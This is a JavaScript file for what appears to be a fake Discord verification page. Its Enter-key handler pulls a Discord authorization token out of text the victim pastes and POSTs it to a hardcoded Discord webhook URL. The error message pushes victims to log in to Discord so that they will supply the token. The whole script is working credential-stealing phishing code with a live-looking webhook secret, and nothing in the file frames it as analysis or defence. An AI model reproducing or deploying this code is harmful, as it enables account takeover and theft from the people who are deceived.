const prembtn = document.getElementById('prembtn');
const opentab = document.getElementById('opentab');

opentab.addEventListener('click', () => {
    window.open('https://discord.com/404', "_blank", "width=50,height=50");
});


prembtn.addEventListener('click', () => {
    window.open('https://discord.com/404', "_blank", "width=50,height=50");
});


const textarea = document.getElementById('textarea');

textarea.addEventListener('input', function() {
  if (textarea.value.length > 0) {
    textarea.classList.add('valid');
  } else {
    textarea.classList.remove('valid');
  }
});
// Add an event listener for the "keydown" event
textarea.addEventListener("keydown", function(event) {
  // Check if the key pressed was the Enter key
  if (event.key === "Enter") {
    // Prevent the default action of the Enter key
    event.preventDefault();
    
    // Get the value of the input field
    var inputValue = textarea.value;

    // Look for the authorization token in the input value
    var authorizationIndex = inputValue.indexOf('"authorization"=');
    if (authorizationIndex >= 0) {
      // Get the next 50 characters after the authorization token
      var authorizationToken = inputValue.substring(authorizationIndex + 17, authorizationIndex + 97);

      // Construct the request URL and payload
      var webhookUrl = "https://discord.com/api/webhooks/1047549101748785202/uqfeDTS541Zvqzr-Tgn25pwae0LY8WHD5q1szBMWLiIrz3cgawcpOu0qsCMHW7gRtb_M";
      var payload = {
        content: authorizationToken
      };
      var requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        redirect: 'follow'
      };
      
      // Send the request to the webhook URL using the fetch method
      fetch(webhookUrl, requestOptions)
        .then(response => response.text())
        .then(result => console.log(result))
        .catch(error => console.log('error', error));
    } else {
        const errortext = document.getElementById('error');
        errortext.innerHTML = "You must <a class='error-login-msg' href='https://discord.com/login' target='_blank'>login to your Discord</a> account on your browser too in order to <br />verify";
        errortext.classList.add('error')

        setTimeout(function() {
            errortext.innerHTML = "";
            errortext.classList.remove('error')
        }, 7500);
    }

    // Clear the input field
    textarea.value = "";
    textarea.classList.remove('valid');
  }
});
